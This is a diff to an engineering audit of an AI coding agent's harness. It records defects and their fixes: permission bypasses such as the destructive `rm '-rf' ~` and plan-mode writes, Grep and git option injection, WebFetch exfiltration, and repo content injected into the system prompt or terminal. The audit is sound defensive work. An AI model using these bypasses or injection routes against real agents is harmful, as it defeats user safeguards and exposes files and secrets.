@@ -96,17 +96,14 @@
 
     Kilo legacy (a `condense` tool with a user-approved preview) and Goose (agent-visible vs user-visible flags) supply the remaining pieces.
 
-11. **The code audit found about 136 new defects** (Part IX), including:
-    - **MCP is broken against servers built on the official TypeScript and Python SDKs.** Empty maps are sent as `[]`, so those servers start with 0 tools after a 60 s block.
-    - **Forked processes share MCP request ids and pipes**, so results get crossed between calls.
-    - **Provider errors and in-stream errors turn into silent empty replies.**
-    - **One non-UTF-8 byte fails every later request.**
-    - **The permission layer can be bypassed:** quoted `rm` flags, writes in plan mode, and Grep option injection.
-    - **Repo content can inject into the terminal and the prompt:** OSC 52 escapes in command descriptions, raw skill descriptions in the system prompt.
-    - **Git MCP allows option injection.**
+11. **The code audit found about 136 new defects** (Part IX). 23 of them, including the one Critical and 17 of the 20 High items, are already fixed on master: MCP interoperability with official-SDK servers, fork-shared MCP connections, silent provider errors, invalid UTF-8, the permission bypasses, git MCP option injection and the repo-supplied terminal escapes. About 117 remain, including:
     - **The TUI re-renders the full history as markdown every frame.**
+    - **Esc Esc leaves tool placeholders spinning, and raw CR reaches the terminal.**
+    - **Killing a turn does not kill the commands it started.**
+    - **Sub-agent spend never reaches the parent or the spend cap,** and the in-process sub-agent path still swallows provider errors.
+    - **Permission gaps remain:** allow rules accept `$(…)`, WebFetch counts as read-only, and Bash inherits provider API keys.
 
-    About two thirds are reproduced with scripts. Fix the Critical and High items first (IX.3, IX.4).
+    About two thirds are reproduced with scripts. Fix the remaining High items first (IX.3, IX.4).
 
 12. **The features you asked for are designed and slotted into the roadmap** (Part VIII):
     - a schema-driven settings editor, built entirely from SugarCraft libraries already in the dependency tree;
@@ -190,7 +187,7 @@ Severity reflects user impact on the live default path.
 | 20 | Medium | Compaction overwrites the displayed and persisted history: scrollback is lost, and `/rewind` checkpoints after compaction hold the compacted text *(partly inferred)* | `Chat::compactionChanges` `:10477-10565` | 05 08 |
 | 21 | Medium | The token estimate ignores the system prompt and tool schemas; percentage thresholds on a 1M window fire at ~734k tokens | `Chat::rawTokenProxy` `:14734-14742` | 03 04 07 09 11 |
 | 22 | Medium | Sub-agent output goes to the parent unescaped, with no "no authority" framing; `/websearch` results are injected as user+assistant pairs | `TaskTool.php:604-629`; `Chat.php:9998` | 01 04 |
-| 23 | Medium | Preset `model`/`permissionMode`/`effort`/`isolation`/`memory`/`background` are inert; preset `tools: Bash(git *)` grants all of Bash (*permission rules* are argument-scoped now; see IX.1); `disallowedTools` is ignored without `tools:`; a read-only reviewer preset can run any shell command | baseline §2.1; `AgentManager.php:1103-1260` | 01 04 05 06 07 08 11 12 |
+| 23 | Medium | Preset `model`/`permissionMode`/`effort`/`isolation`/`memory`/`background` are inert; preset `tools: Bash(git *)` grants all of Bash (*permission rules* are argument-scoped, and `docs/PERMISSIONS.md` now says so; see IX.1); `disallowedTools` is ignored without `tools:`; a read-only reviewer preset can run any shell command | baseline §2.1; `AgentManager.php:1103-1260` | 01 04 05 06 07 08 11 12 |
 | 24 | Medium | Parallel Task fan-out has no cap (`AgentPoolConfig::maxConcurrent=5` is used only for workflows) | `Runtime::executeConcurrently` `:1853` | 07 10 11 |
 | 25 | Medium | Edit is exact-match only, with a terse error; no staleness check; `Write overwrite:true` can overwrite edits the user made since the last read | `Edit.php:178-197` | 02 04 05 07 08 09 10 11 |
 | 26 | Medium | Read has no paging (up to 1 MiB), no line numbers, and no continuation | `Read.php` | 02 04 06 07 10 11 12 |
@@ -594,7 +591,8 @@ The root issue is 1.C: asks cannot be answered.
 > 3. **TUI permission default:** moves off `bypass-permissions` once engine-path approvals (Wave 1.C / server Phase 1) work.
 > 4. **Model choice:** the settings editor **persists the model choice**. This reverses the `docs/SETTINGS.md` "no model is persisted" contract, so update that doc and its drift tests in the same change.
 > 5. **Settings file:** the editor writes **`config.json`**, the file the app already writes (`Bootstrap::writeUserConfig()`, `Bootstrap.php:3608`). The "settings.json is never written" invariant and the current precedence stay unchanged.
-> 6. **Still open:** whether to commit the web `dist/` (recommended, like the GIFs), and whether TLS via a reverse proxy is enough for v1 (recommended).
+> 6. **Web build:** `sugar-crush-web/dist/` **is committed**, like the GIFs; CI checks it matches the source.
+> 7. **Still open:** whether TLS via a reverse proxy is enough for v1 (recommended).
 
 The user asked for these five features while the research was running:
 - a settings form or pane, with more of sugar-crush's behaviour made configurable;
@@ -809,22 +807,27 @@ The new requests overlap heavily with Wave 1.C. The recommended build order is:
 
 Five agents audited sugar-crush's own source for **new** defects, one per area. Each was told the Part II list so it would not re-report known items. They worked from master @ `05db616f3` with PHP 8.3.6, wrote repro scripts under `/home/sites/crush-research-repos/_audit-scratch/<id>/`, changed no source and committed nothing.
 
-**Totals: about 136 findings** — 1 Critical, 20 High, about 47 Medium, and the rest Low-Medium, Low or Info. About two thirds were **reproduced with a script**; the rest are verified by reading, and a few are marked *suspected*. Full write-ups are in Appendices Q–U; each finding has code excerpt, failure scenario, fix and a test that would catch it.
+**Totals at audit time: about 136 findings** — 1 Critical, 20 High, about 47 Medium, and the rest Low-Medium, Low or Info.
+
+**Since the audit, 23 findings have been fixed on master** (each appendix ends with a **Fixed since audit** list giving the commit), and 4 new remaining items were found while fixing them. **About 117 findings remain** — 0 Critical, 4 High (one of them latent), 3 Medium-High, about 45 Medium, and the rest Low-Medium, Low or Info. The tables below count what remains.
+
+At audit time, about two thirds were **reproduced with a script**; the rest are verified by reading, and a few are marked *suspected*. Full write-ups are in Appendices Q–U; each finding has code excerpt, failure scenario, fix and a test that would catch it.
 
 | Appendix | Area | Findings | Critical / High |
 |---|---|---|---|
-| **Q** (15a) | Engine, runtime, providers, tool-call parsers, process support | 30 | 0 / 4 |
-| **R** (15b) | Chat state machine, TUI, rendering, commands | 23 | 0 / 4 |
-| **S** (15c) | Tools, permissions, hooks (security) | 31 | 0 / 4 |
-| **T** (15d) | Context assembly, memory, skills, config | 24 | 0 / 4 |
-| **U** (15e) | Agents, workflows, sessions, MCP, git MCP, CLI | 28 | 1 / 4 |
+| **Q** (15a) | Engine, runtime, providers, tool-call parsers, process support | 27 | 0 / 0 |
+| **R** (15b) | Chat state machine, TUI, rendering, commands | 21 | 0 / 2 |
+| **S** (15c) | Tools, permissions, hooks (security) | 24 | 0 / 0 |
+| **T** (15d) | Context assembly, memory, skills, config | 21 | 0 / 1 |
+| **U** (15e) | Agents, workflows, sessions, MCP, git MCP, CLI | 24 | 0 / 1 |
 
 Appendix P adds three session-picker bugs, B1–B3 (Part VIII.4).
 
 ## IX.1 Corrections to earlier parts
 
 - **Argument-scoped permission rules ARE implemented** (Appendix S, top callout; `PermissionRule::matches()` / `matchesShellSubject()`). `Bash(rm *)` deny denies, and `Bash(git *)` no longer grants all of Bash for **permission rules**.
-  - Part II #23 and roadmap item 4.2 are therefore partly out of date, and so is `docs/PERMISSIONS.md` §"Pattern matching is name-only".
+  - Part II #23 now says so; roadmap item 4.2 is partly out of date.
+  - `docs/PERMISSIONS.md` is now corrected: its stale "Pattern matching is name-only" section was rewritten in `d3d90fece` to describe argument-scoped rules as implemented, including the open F-P5 hole.
   - Sub-agent **preset grants** still match by name (`AgentManager::resolveGrantedTools`).
   - The new matcher's real gaps are F-P5 (`$(…)`, backticks and redirects slip past allow rules) and F-J3 (path rules miss relative and absolute respellings and symlinks).
 - **Two documentation statements are stale:** "rule `paths:` scoping not applied" (it is; 15d-19) and "only two keys re-applied per turn" (`maxOutputTokens` is too).
@@ -835,26 +838,22 @@ Appendix P adds three session-picker bugs, B1–B3 (Part VIII.4).
 
 Several audits found the same root cause in different places. Fixing each theme once fixes them all.
 
-1. **Invalid UTF-8 anywhere kills the turn.**
-   - Tool output (F-T1, A6) and instruction, rule, skill or memory files (15d-08) reach Guzzle's `json_encode`, which throws, and the throw is classified non-transient. Vertex sends an empty body instead.
-   - **Fix:** scrub once in `Runtime::settle()` and in the prompt loaders (`mb_scrub`, or `JSON_INVALID_UTF8_SUBSTITUTE`). A provider test pins the throw for caller-supplied schemas, so don't fix it in the provider.
-2. **MCP request ids and pipes are shared across forks.**
-   - Every turn fork restarts the id counter, so a killed call shifts every later result by one, permanently (B1).
-   - Parallel sub-agents and workflow stages share the parent's pipes, so concurrent calls get each other's replies (AG-1).
-   - The LSP client has the same latent flaw.
-   - **Fix:** the MCP client is process-affine. Give each fork its own connection (or an id-namespaced broker), and drain or reset after a kill.
+1. **Invalid UTF-8 (residue).** Tool results are now scrubbed in `Runtime::settle()` and prompt files at load time.
+   - The command backends (`CommandBackend`, `StreamingCommandBackend`) still encode history without `JSON_INVALID_UTF8_SUBSTITUTE`, so one bad byte in a Chat row fails every later turn on those backends (A22).
+   - **Fix:** add the flag, or route both through one shared encoder.
+2. **Fork-shared connections (residue).** MCP stdio and HTTP connections are now fork-safe.
+   - The LSP client got process-unique ids but no cross-process exchange lock. That lock must land before LSP is wired (B7).
 3. **Killing a turn does not kill its commands.** Esc Esc or the watchdog SIGKILLs only the PHP child. The `setsid`'d `bash` (and Task grandchildren) keep running (B2, F-E2). **Fix:** kill the process group(s) recorded by `ProcessContainment`, and reap Task children.
 4. **Terminal-injection and rendering hygiene.**
    - Raw CR reaches the frame (15b-07).
    - UTF-8 C1 controls pass every sanitizer (15b-08).
-   - A cloned repo's command description puts OSC 52 clipboard writes and screen clears on the wire when the user types `/` (15b-16).
    - The tab strip is neither clipped nor sanitized (15b-18).
    - A forged image marker repaints images (15b-17).
    - `error_log()` output paints over the TUI (C2).
    - The latent permission modal wraps by bytes and keeps CR, which **must be fixed before Wave 1.C ships** (15b-19).
    - **Fix:** one `Sanitize::forTerminal()` covering C0, C1, CR, ESC, OSC, PUA and grapheme-aware width, enforced at every render site (golden width tests), plus `error_log` routed to a file or the notice sink while the TUI owns the screen.
 5. **Repo-controlled content reaches the prompt without fencing or caps.**
-   - Skill descriptions go in raw, multi-line, even inside `<system-reminder>` (15d-02).
+   - Skill descriptions are now escaped, one-line and capped, but the listing is still not fenced as its own section and carries no source badge (15d-02, partly fixed).
    - A repo's skills shadow the user's own (15d-03).
    - CLAUDE.md, AGENTS.md and `@imports` have no size cap (15d-09, C3).
    - PromptFence misses tags that carry attributes, and chat-template control tokens aren't defanged (15d-10).
@@ -868,22 +867,13 @@ Several audits found the same root cause in different places. Fixing each theme 
    - These also hurt cache stability (Part I #2).
    - **Fix:** `git -c color.ui=never --no-optional-locks`, `--no-ext-diff`, a timeout, `rev-parse --show-toplevel`, and sorted walks.
 7. **Errors are swallowed and turns "succeed".**
-   - Provider `isError` responses become silent empty replies, and two tests pin that bug (A1).
-   - SGLang in-stream errors are ignored (A2).
-   - A dropped stream counts as complete (A3).
+   - `AgentManager::executeSubAgent()` swallows provider errors the way `Runtime` did before its fix: the sub-agent completes with empty output (AG-4, latent).
    - Tool calls are lost on `finish_reason=stop` (A4).
    - Malformed arguments run the tool with `[]` (A11).
    - Vertex 429/503 are never retried (A19).
-   - A malformed memory file breaks every turn because `catch (\Exception)` misses `TypeError` (15d-04).
-   - Mistyped SKILL.md frontmatter crashes at launch, even in an untrusted clone (15d-01).
 8. **The permission layer has holes in the default and stricter modes.**
-   - Quoted flags (`rm '-rf' ~`) bypass both rm guards, and the breaker checks only the first target (F-P1).
-   - Plan mode allows `>f`, `sed -i`, `rm` and `git push --force` (F-P2).
-   - Grep option injection (`-Re…`) follows symlinks out of the jail (F-J1).
-   - The `.env` guard is trivially bypassed (F-J2).
-   - `.git/hooks/` is unprotected (F-J4).
    - Accept-edits mode allows `rm`, `mv` and `cp` (F-P4).
-   - WebFetch counts as read-only, so it can exfiltrate data unprompted (F-P6), and its SSRF blocklist misses 100.64/10 (Tailscale, Alibaba metadata), NAT64 and 6to4 (F-W1).
+   - WebFetch counts as read-only, so it can exfiltrate data unprompted (F-P6).
    - Bash and hooks inherit provider API keys (F-E1).
    - A PostToolUse block is a no-op (F-H1).
    - Hook JSON escapes `/`, so grep-style deny hooks never fire (F-H3).
@@ -894,17 +884,14 @@ Several audits found the same root cause in different places. Fixing each theme 
    - `/branch` does one INSERT per message: a 4.3 s freeze at 800 messages (15b-21).
    - `AgentManager` never forgets sub-agents (AG-3).
 10. **Sessions and persistence integrity.**
-    - `/rewind` keeps the undone prompt **and** puts it back in the input box (SES-1).
     - `forkSession` copies dead tables, so the fork is empty and `--resume name` opens the parent. This is a root cause of "/fork ignores history" (SES-2).
     - No writer lock: two TUIs on one session clobber each other (SES-3).
     - UI-only command output is sent to the model as real turns (15b-03; relates to Part II #2 and the DCP `uiOnly` proposal).
-11. **MCP interoperability is broken for mainstream servers.**
-    - Empty maps are sent as `[]`, so official TypeScript and Python SDK servers start with **0 tools after a 60 s block** (MCP-1, **Critical**).
-    - Streamable HTTP gets 406 and has no session-id or SSE handling (MCP-2).
+11. **MCP: remaining interoperability and trust gaps.**
+    - Empty maps nested inside a tool's own arguments still go on the wire as `[]` (MCP-9).
     - `claude-mcp` gives up after about 1 s (MCP-3).
     - OAuth discovery and storage bugs (MCP-6/7/8).
     - Trust is bound to the project path, not to `.mcp.json`'s content (MCP-5).
-    - Git MCP allows option injection (`gitShow --output=` writes arbitrary files) and deadlocks on more than 64 KiB of stderr (GIT-1, GIT-2).
 12. **Cost accounting holes.**
     - Task sub-agent spend never reaches the parent or the cap (B4).
     - Vertex is priced at $0 and Bedrock invents $0.01 (A15, A20).
@@ -915,40 +902,22 @@ Several audits found the same root cause in different places. Fixing each theme 
 
 ## IX.3 Critical and High findings: fix first
 
+The Critical item and 17 of the 20 High items are fixed on master. These remain:
+
 | ID | Area | Finding | Repro |
 |---|---|---|---|
-| **MCP-1** (Crit) | MCP | Empty maps sent as `[]`: official TS/Python SDK MCP servers start with 0 tools after a 60 s block; no-argument tools fail; error reply to `initialize` accepted | ✔ |
-| AG-1 | Agents/MCP | Forked sub-agents and parallel stages share the parent's MCP pipes and id counter; concurrent calls get each other's results | ✔ |
-| B1 | Engine/MCP | MCP ids reset per fork; a killed call shifts every later result by one, permanently | ✔ |
-| MCP-2 | MCP | Streamable HTTP: 406 (no Accept), no `Mcp-Session-Id`, no SSE | ✔ |
-| GIT-1 | Git MCP | Option injection (`gitShow --output=` writes any file); uncontained `path` | ✔ |
-| GIT-2 | Git MCP | Deadlock on more than 64 KiB stderr (chatty pre-commit hook); no timeout | ✔ |
-| A1 | Providers | Provider error responses become silent empty replies (401 → blank) | ✔ |
-| A2 | Providers | SGLang in-stream error (e.g. context length exceeded) ignored | ✔ |
-| A6 / F-T1 / 15d-08 | Encoding | One non-UTF-8 byte in a tool result or prompt file fails every request | ✔ |
-| F-J1 | Tools | Grep option injection escapes the path jail via symlinks | ✔ |
-| F-P1 | Permissions | `rm '-rf' ~` bypasses the step-0 breaker and ConfirmRemoveHook | ✔ |
-| F-P2 | Permissions | Plan mode allows writes via redirection, `sed -i`, `rm`, `git push --force` | ✔ |
-| 15b-01 | Chat/hooks | UserPromptSubmit hook (e.g. a secret blocker) skipped when the prompt is parked behind 85% compaction | ✔ |
 | 15b-02 | Chat | After Esc Esc, "running" placeholders spin forever; later same-id results land on the old row | ✔ |
 | 15b-07 | TUI | Raw CR reaches the terminal (progress-bar output in Ctrl+O view overwrites panes) | ✔ |
-| 15b-16 | TUI/security | Cloned repo's command description emits OSC 52 clipboard writes and screen clears on `/` | ✔ |
-| 15d-01 | Skills | Mistyped SKILL.md frontmatter crashes at launch (untrusted clone) | ✔ |
-| 15d-02 | Skills/prompt | Repo skill descriptions injected raw into the system prompt and `<system-reminder>` | ✔ |
-| 15d-04 | Memory | One malformed memory file → TypeError on every turn | ✔ |
+| 15d-02 | Skills/prompt | Repo skill descriptions reach the prompt in harness voice. Partly fixed (escaped, one-line, capped); still no fenced section and no source badge | ✔ |
+| AG-4 | Agents | `AgentManager::executeSubAgent()` swallows provider errors like `Runtime` did before A1's fix (latent: no `src/` caller today) | reading |
 
 ## IX.4 Where the audit fixes slot into the roadmap
 
-- **Before Wave 0, as an "audit hotfix" wave (mostly S):**
-  - MCP-1 and MCP-2 (MCP is unusable with mainstream servers);
-  - A1, A2 and A3 (silent failures);
-  - the UTF-8 scrub (theme 1);
-  - GIT-1 and GIT-2;
-  - F-P1, F-P2, F-J1, F-J2, F-J4 and F-W1;
-  - 15b-01 and 15b-16;
-  - 15d-01, 15d-02 and 15d-04;
-  - SES-1;
-  - B1/AG-1 (per-fork MCP connections, M).
+- **Before Wave 0, as an "audit hotfix" wave (mostly S):** most of this wave has landed on master (see the **Fixed since audit** list at the end of each of Appendices Q–U). What is left of it:
+  - the 15d-02 remainder (a fenced skills section and a source badge);
+  - AG-4 (the sub-agent error swallow);
+  - A22 (the command-backend UTF-8 flag);
+  - MCP-9 (nested empty maps).
 - **With Wave 0:**
   - process-group kill (theme 3);
   - git env hardening (theme 6);
@@ -969,7 +938,7 @@ Several audits found the same root cause in different places. Fixing each theme 
   - session picker bugs B1–B3;
   - 15b-21 and 15b-22.
 - **With rendering work:** 15b-10 (cache rendered markdown per row, render only the visible window), 15b-04 and 15b-20 (move hooks and shell into `Cmd`).
-
+- **Before LSP is wired (Wave 3.F):** the LSP exchange lock (B7).
 
 
 ---
@@ -19643,55 +19612,6 @@ Confidence key: **Verified-by-repro** (a repro script showed the behaviour), **V
 
 ### A. Providers: error handling, SSE parsing, wire format
 
-#### A1 — Provider errors returned as `isError` responses are silently turned into an empty assistant reply
-- **Severity:** High · **Confidence:** Verified-by-repro (`repro_error_swallow.php`)
-- **Where:** `src/Runtime.php:1419-1459` (streaming), `src/Runtime.php:1496-1567` (batch). Producers are `src/Providers/CustomProvider.php:201-213` and `:346-357`, plus `src/Providers/VertexProvider.php:318-334`, `:404-415`, `:874-889`, `:1132-1153`, `:1264-1279`, `:1384-1391` and `:1567-1584`.
-- **Code:**
-  ```php
-  // Runtime::runStreaming
-  if ($response->isError) { $errorChunk = $response; }
-  ...
-  if ($errorChunk === null || $lastAttempt || $emitted || !TransientFailure::responseIsTransient($errorChunk)) { break; }
-  ...
-  yield new AssistantMessage($buffer, $toolCalls ?: null, $reasoning, Usage::sum($usages), $lengthStopped);
-  ```
-  `$errorChunk->errorMessage` is never read anywhere in `src/Runtime.php`. `runBatch` behaves the same way: it `break`s and yields `$response->content` (which is `''`).
-- **Failure scenario:** any `custom` provider, the `anthropic` type (which is a `CustomProvider`), or Vertex gets an auth failure (401), a 400, a 404 for a bad model, or a blocked prompt. **Repro output:** a 401 `{"error":{"message":"Incorrect API key provided"}}` comes back from `EngineBackend::complete()` with no exception: `content=''` and `stepsTruncated=false`, in both streaming and batch modes. The user sees a blank reply, and the error text is lost. Transient errors are retried (MAX_ATTEMPTS), but once retries run out they are swallowed the same way.
-- **Fix:** after the retry loop, if `$errorChunk !== null` (streaming), or if `$response->isError` (batch), throw `new ProviderException($errorChunk->errorMessage ?? 'provider error')`. That lets `EngineBackend`/`TurnInterrupted` report it. Alternatively, providers could throw instead of returning `isError`.
-- **Test:** use a `MockHandler` that returns 401 for `CustomProvider(stream=true/false)`. Assert that `EngineBackend::complete()` throws and that the message contains "Incorrect API key". Add a Vertex variant using a stub `streamer` that yields an `error` event.
-- **Existing tests that pin the bug (they must change with the fix):** `tests/Integration/ProviderRetryWiringTest.php::testABatchUnclassifiedErrorResponseIsNotRetried` asserts `content() === ''` ("the pre-retry outcome is unchanged"). `::testAnUnclassifiedStreamErrorChunkLeavesTheOutcomeUnchanged` asserts a mid-stream non-transient error ends as a successful `'half '` reply. Both assertions describe the silent swallow, so they have to become `expectException`. **No conflict with `tests/Backend/ReasoningProgressTest.php`:** its retry cases (`testAStreamThatOnlyThoughtBefore…`, through `ThinkThenFailDouble`) put the error chunk on attempt 1, and attempt 2 is clean. The throw belongs **after** the retry loop, only when the final attempt still holds `$errorChunk`. The `$emitted` latch semantics are therefore unchanged. Throwing inside the loop would break these tests.
-
-#### A2 — SGLang's in-stream error event (`data: {"error":{...}}`) is silently ignored, so the turn "succeeds" with partial or empty text
-- **Severity:** High · **Confidence:** Verified-by-repro (`repro_sglang_stream.php`, case `error-event`)
-- **Where:** `src/Providers/SglangProvider.php:769-818`. The same shape is in `src/Providers/CustomProvider.php:291-317`.
-- **Code:**
-  ```php
-  $data = json_decode(substr($line, 6), true);
-  $streamFinishReason = $data['choices'][0]['finish_reason'] ?? $streamFinishReason;
-  if ($data !== null && isset($data['choices'][0]['delta'])) { ... yield $chunk; }
-  elseif ($data !== null && !isset($data['choices'][0]) && is_array($data['usage'] ?? null)) { ... }
-  // anything else (an {"error":...} object) is dropped
-  ```
-- **Failure scenario:** SGLang's OpenAI server reports errors raised after the response has started (for example "input is longer than the model's context length", or abort/OOM) as HTTP 200 plus `data: {"error":{"message":...,"code":400}}` and then `data: [DONE]`. **Repro:** `Hel` followed by that error event gives one chunk `{"content":"Hel"}`, no exception and no `isError`. `SglangProvider` never sets `isError` at all, so the Runtime's error-chunk retry (A1) can never trigger on the default provider. This matters most together with known #5 (no overflow recovery): a session that grows past the window gets empty or truncated replies with no error shown.
-- **Fix:** in the SSE loop, if `is_array($data['error'] ?? null)` (or `($data['object'] ?? null) === 'error'`), throw a `ProviderException` that carries the message and code. Mark it transient when the code is 5xx or 429. Apply the same change in `CustomProvider`.
-- **Test:** stream a body containing an `error` event. Assert that `completeStream()` throws, and that `EngineBackend::complete()` rejects or throws with the server's message.
-
-#### A3 — A stream that ends without `finish_reason` (connection drop) is treated as a complete answer when it has no tool calls
-- **Severity:** Medium · **Confidence:** Verified-by-repro (case `drop-text`)
-- **Where:** `src/Providers/SglangProvider.php:836-904`. `CustomProvider.php:281-345` does no end-of-stream check at all, and neither does Vertex (Verified-by-reading). In `VertexProvider::completeStream()` (`:380-403`), a stream that ends before `message_delta`/`message_stop` falls out of the `foreach` with no "saw a stop" check. `streamGemini()` flags only `lengthStopped` and never a missing `finishReason`.
-- **Code:**
-  ```php
-  $streamEndedTruncated = $streamFinishReason === null || in_array($streamFinishReason, self::TRUNCATED_FINISH_REASONS, true);
-  $truncatedFlush = $streamEndedTruncated && $toolCallBuffer !== [] ? self::flushTruncatedToolCalls($toolCallBuffer) : null;
-  ...
-  } elseif (in_array($streamFinishReason, self::TRUNCATED_FINISH_REASONS, true)) {   // null is NOT in the list
-      yield new CompleteResponse(content: '', truncated: true);
-  }
-  ```
-- **Failure scenario:** a proxy idle-timeout, a server restart or a network reset happens mid-answer. The streaming path uses Guzzle's StreamHandler, where `eof()` simply becomes true and nothing is thrown. Result: `"The fix is to chan"` comes back as a final, untruncated answer. `lengthStopped` is false, there is no retry and no notice. The tool-call branch treats `null` as truncated, so the two branches disagree.
-- **Fix:** if the stream reaches EOF without any `finish_reason` and without `[DONE]`, throw a transient "stream ended prematurely" `ProviderException`. It will be retried when nothing has been emitted yet. At minimum, yield `truncated: true`.
-- **Test:** stream content chunks with no `finish_reason` and no `[DONE]`. Assert either an exception or `truncated === true`.
-
 #### A4 — Streamed tool calls are emitted only from a chunk where `finish_reason === 'tool_calls'` and `delta` is non-null; otherwise they are silently dropped
 - **Severity:** Medium · **Confidence:** Verified-by-repro (cases `tc-finish-stop` and `tc-delta-null`)
 - **Where:** `src/Providers/SglangProvider.php:779` and `:2048`, `src/Providers/CustomProvider.php:308-310` and `:620`.
@@ -19711,21 +19631,15 @@ Confidence key: **Verified-by-repro** (a repro script showed the behaviour), **V
 - **Where:** `SglangProvider.php:769`, `CustomProvider.php:291`.
 - **Code:** `if (str_starts_with($line, 'data: '))`
 - **Failure scenario:** the SSE spec allows `data:{...}`, and some OpenAI-compatible gateways emit it. Every chunk is then dropped and the reply is empty.
+- **Since A3 was fixed** (`9105a64ae`): a stream framed this way now ends with no finish signal, so it surfaces as a premature-end error instead of a silently empty reply. The chunks are still dropped.
 - **Fix:** strip the `data:` prefix and then `ltrim` a single optional space.
 - **Test:** a body using `data:{...}` should yield content.
-
-#### A6 — One non-UTF-8 byte in any tool output makes the next provider request fail, non-transiently
-- **Severity:** High · **Confidence:** Verified-by-repro (`repro_utf8.php`)
-- **Where:** request encoding: Guzzle `'json' => $params` at `SglangProvider.php:648` and `:686`, and `CustomProvider.php:194` and `:258`. The input is not scrubbed: `src/Tools/Concerns/CapturesProcessOutput.php:176-217` (Bash) has no `mb_scrub`, and neither does `TruncatesOutput`.
-- **Failure scenario:** Bash runs `printf 'caf\xe9'`, or `cat`/`grep`/`git diff` touches a Latin-1 file, or a binary file is read. **Repro:** the Bash tool result is not valid UTF-8. The next `completeStream()` throws `RuntimeException: SGLANG request failed: json_encode error: Malformed UTF-8 characters`, and `TransientFailure::isTransient()` returns `false`. The turn dies with a confusing error. Any transcript that replays that tool row will fail the same way, on every later step and on Task resume. `CommandBackend::encodeHistory` (`CommandBackend.php:408-416`) gives `_[error: failed to encode history]_` on every turn once such bytes are in history. Vertex fails differently: `VertexProvider::httpBody()` (`:2410`) and `protobufMessage()`/`toProtobufValues()` (`:2487`, `:2507`) use `(string) json_encode(...)`, so the same bytes send an **empty** body. The 400 that comes back is non-transient (see A19) and is then swallowed (A1).
-- **Fix:** scrub at one choke point. Either apply `mb_scrub($content, 'UTF-8')` in `ToolResultMessage::__construct`/`Runtime::settle()`, or encode the body yourself with `JSON_INVALID_UTF8_SUBSTITUTE` and pass it as `body`. Do the same in `CommandBackend`/`StreamingCommandBackend::begin`.
-- **Test:** build a `ToolResultMessage` with `"\xe9"`, send it through `SglangProvider::completeStream()` with a history middleware, and assert that the request was sent with `�`.
 
 #### A7 — `formatToolCalls()` re-serialises every list argument as an object (`JSON_FORCE_OBJECT` applies recursively)
 - **Severity:** Medium · **Confidence:** Verified-by-repro (`repro_force_object.php`)
 - **Where:** `src/Providers/Concerns/ToolSchema.php:186`. This is used by the Sglang, Custom and OpenAI history formatters.
 - **Code:** `'arguments' => json_encode($call->arguments(), JSON_FORCE_OBJECT) ?: '{}',`
-- **Failure scenario:** the model calls `mcp__git__git_add {"paths":["a.php","b.php"]}` (`GitMcpServer.php:120` declares `paths` as an array). On every later step and turn, the history sent back says `{"paths":{"0":"a.php","1":"b.php"}}`. The model sees its own earlier calls in the wrong shape and tends to copy them. Any MCP tool whose schema requires an array then gets objects, so validation fails or the server misbehaves. Separately, `?: '{}'` silently replays a call as having no arguments when `json_encode` fails (for example on invalid UTF-8; see A6).
+- **Failure scenario:** the model calls `mcp__git__git_add {"paths":["a.php","b.php"]}` (`GitMcpServer.php:120` declares `paths` as an array). On every later step and turn, the history sent back says `{"paths":{"0":"a.php","1":"b.php"}}`. The model sees its own earlier calls in the wrong shape and tends to copy them. Any MCP tool whose schema requires an array then gets objects, so validation fails or the server misbehaves. Separately, `?: '{}'` silently replays a call as having no arguments when `json_encode` fails (for example on invalid UTF-8).
 - **Fix:** `$args === [] ? '{}' : json_encode($args, JSON_UNESCAPED_UNICODE | JSON_INVALID_UTF8_SUBSTITUTE | JSON_THROW_ON_ERROR)`. Force object only at the top level.
 - **Test:** replay an assistant tool call with a list argument. Assert that the outgoing `arguments` string decodes to a JSON array.
 
@@ -19752,7 +19666,7 @@ Confidence key: **Verified-by-repro** (a repro script showed the behaviour), **V
 - **Severity:** Medium · **Confidence:** Verified-by-reading. Server rejection was not reproduced, because that needs a live strict endpoint.
 - **Where:** `src/Providers/CustomProvider.php:172` and `:240`.
 - **Code:** `'extra_body' => ['separate_reasoning' => true],`
-- **Failure scenario:** `extra_body` belongs to the OpenAI Python SDK, which merges it into the body before sending. Sent raw, it is an unknown top-level field. Strict OpenAI-compatible servers (api.openai.com answers "Unrecognized request argument supplied: extra_body", and so do several hosted gateways) return 400 on every request. Through A1, that 400 then becomes a silent empty reply. Servers that ignore unknown fields never see `separate_reasoning` either.
+- **Failure scenario:** `extra_body` belongs to the OpenAI Python SDK, which merges it into the body before sending. Sent raw, it is an unknown top-level field. Strict OpenAI-compatible servers (api.openai.com answers "Unrecognized request argument supplied: extra_body", and so do several hosted gateways) return 400 on every request. (Before the A1 fix that 400 became a silent empty reply; it now surfaces as an error.) Servers that ignore unknown fields never see `separate_reasoning` either.
 - **Fix:** send `'separate_reasoning' => true` at the top level, and only for providers known to accept it, or make it a config flag.
 - **Test:** capture the outgoing body with history middleware. Assert that it has no `extra_body` key.
 
@@ -19821,7 +19735,7 @@ Confidence key: **Verified-by-repro** (a repro script showed the behaviour), **V
 - **Why this is materially new:** Part II #27 places the 4096 default on Custom/OpenAI. It is also the default path. In SGLang, generated reasoning tokens count against `max_tokens`, so a max-effort think can use the whole budget. That gives `finish_reason: length` with empty content, which is exactly known #28's "thinking-only reply ends turn", now with a likely root cause on the default configuration.
 - **Fix:** set a model-aware default (for example 32k+ for V4 at effort max), or omit `max_tokens` so the server's default applies.
 
-#### A19 — Vertex transport errors are never classified as transient: 429 `RESOURCE_EXHAUSTED` and 503 `UNAVAILABLE` get no retry, and the turn then ends empty (A1)
+#### A19 — Vertex transport errors are never classified as transient: 429 `RESOURCE_EXHAUSTED` and 503 `UNAVAILABLE` get no retry
 - **Severity:** Medium · **Confidence:** Verified-by-repro (`repro_vertex_transient.php`)
 - **Where:** `src/Providers/TransientFailure.php:197-237` and `:405-422`. The callers are `VertexProvider.php:318-334`, `:404-415` and `:1384-1391`, each of which sets `errorTransient: TransientFailure::isTransient($e)`.
 - **Code:**
@@ -19831,7 +19745,7 @@ Confidence key: **Verified-by-repro** (a repro script showed the behaviour), **V
   return null;
   // ...and no instanceof arm for ApiException, so the chain walk ends with `false`
   ```
